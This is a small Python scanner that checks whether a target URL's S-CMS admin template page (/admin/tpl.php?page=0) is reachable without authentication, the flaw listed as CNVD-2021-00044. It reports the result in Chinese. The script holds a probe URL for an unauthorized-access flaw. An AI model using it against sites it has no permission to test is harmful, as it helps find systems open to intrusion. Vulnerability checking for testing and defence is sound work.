import requests
import sys
import getopt
import re

'''
LOGO = R"""
 █▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                 
"""
'''
#headers= {
 #   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36"
    
#}

#url = input("url: ")


#payload = url +"/admin" + "/tpl.php?page=0"
#print(qingqiu)
 #   try:
#print("%s                %s" % (qingqiu, response))
#print(re)
'''
if re.status_code == 200:
    print("\033[0;32;47m %s                   + 存在CNVD-2021-00044 S-CMS 未授权访问漏洞 \033[0m" % (url))
else:
    print("\033[0;31;47m %s                   - 未发现漏洞信息 \033[0m" % (url))
'''
def scan(url,pages):
    payload = url +"/admin" + "/tpl.php?page=0"
    #print(payload)
    r = requests.get(url = payload)
    if r.status_code == 200:
        print("\033[0;32;47m %s                   + 存在CNVD-2021-00044 S-CMS 未授权访问漏洞 \033[0m" % (url))
    else:
        print("\033[0;31;47m %s                   - 未发现漏洞信息 \033[0m" % (url))



def start(argv):
    url = ""
    pages = ""
    if len(sys.argv) < 2:
        print("-h 帮助信息;\n")
        sys.exit()
    try:
        banner()
        opts,argv = getopt.getopt(argv,"-u:-h")
    except getopt.GetoptError:
        print('Error')
        sys.exit()
    for opt,arg in opts:
        if opt == "-u":
            url = arg
        elif opt == "-h":
            print(usage())
    scan(url,pages)

def banner():
    print('\033[1;34m############################\033[0mPURPLE\033[1;34m############################\033[0m\n')

def usage():
    print('-h: 帮助')
    print('-u: 域名')
    sys.exit()


if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("killing all.....")
